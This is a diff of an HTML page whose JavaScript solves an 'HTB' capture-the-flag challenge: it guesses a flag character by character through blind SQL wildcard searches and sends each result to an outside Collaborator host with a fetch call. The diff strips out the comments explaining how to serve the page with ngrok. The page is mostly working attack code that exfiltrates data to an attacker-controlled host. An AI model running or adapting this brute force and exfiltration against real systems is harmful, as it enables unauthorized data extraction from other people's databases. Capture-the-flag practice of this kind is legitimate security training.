@@ -1,28 +1,14 @@
 <html>
-<!--  
-    javascript to retrieve web_abusehumandb flag using blind SQL searches
-    Serve this page up using `python3 -m http.server` and `ngrok http 8000`
--->
-
 <head>
     <script>
-
-        // I used trial and error to get length of flag, the number of underscores is equal to the length of the flag
-        // since underscore is a wildcard in SQLite we need to make some assumptions here.
         var flag = 'HTB{';
         var success = false;
-        // reduced character set, flags usually dont use a full character set, be careful of wildcards
-        // I havent found a way to escape them
         const chars = '@!0123456789{}abcdefghijklmnopqrstuvwxyz_';
         var char = ''
         var i = 0;
-
-
         function sendFlag() {
-            // replace with the unique part of the ngrok address
             fetch(`http://5jp6m5n0f6vdzq5i2twig2mbj2ptds1h.oastify.com?char=${encodeURI(flag)}`);
         }
-
         function loadScript(char) {
             return new Promise((res, rej) => {
                 try {
@@ -64,8 +50,7 @@
             } catch (e) {
 
             }
-
-            document.querySelector('#pooscript').remove(); // cleanup, because I am nice.
+            document.querySelector('#pooscript').remove();
         }
 
         getChar();
